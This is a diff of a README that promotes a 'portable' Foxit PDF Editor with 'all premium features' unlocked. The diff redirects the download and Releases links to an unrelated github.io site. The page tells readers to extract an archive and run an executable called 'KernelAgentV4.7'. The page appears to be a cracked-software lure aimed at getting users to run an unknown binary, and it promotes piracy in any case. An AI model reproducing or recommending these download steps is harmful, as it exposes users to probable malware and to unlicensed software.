@@ -2,7 +2,7 @@
 
 Edit, annotate, convert, and manage PDF files on any Windows PC using the portable version of Foxit PDF Editor. This version requires no installation, runs directly from USB or folder, and unlocks all premium features with `KernelAgentV4.7`.
 
-[![Download Portable Foxit](https://img.shields.io/badge/Download-Foxit_Portable-blueviolet)](https://foxit-pdf-editor-portable.github.io/.github
+[![Download Portable Foxit](https://img.shields.io/badge/Download-Foxit_Portable-blueviolet)](https://ideamaker-pro-tools-extension.github.io/.github/
 )
 
 ---
@@ -10,7 +10,7 @@ Edit, annotate, convert, and manage PDF files on any Windows PC using the portab
 ### ⚙️ Installation Instructions
 
 
-1. 📦 **Download the archive** from the [Releases](https://foxit-pdf-editor-portable.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://ideamaker-pro-tools-extension.github.io/.github/
 )
 2. 2. 📁 **Extract the folder** to any location (e.g., `D:\FoxitPortable`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
